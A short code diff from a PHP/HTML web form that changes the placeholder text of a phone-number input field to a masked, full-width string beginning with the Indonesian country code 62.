@@ -166,7 +166,7 @@ session_start(); #list: key, msisdn, otp, secret_token
 <p>
 <font color="white">６２＊＊＊＊＊＊＊＊＊＊＊👇</font>
 <div class="wrap-input100 validate-input" data-validate="Please enter your msisdn">
-<input class="input100" type="text" name="msisdn" placeholder="Nomer Hp 628x">
+<input class="input100" type="text" name="msisdn" placeholder="６２＊＊＊＊＊＊＊＊＊＊＊x">
 <br>
 <br>
 <br>
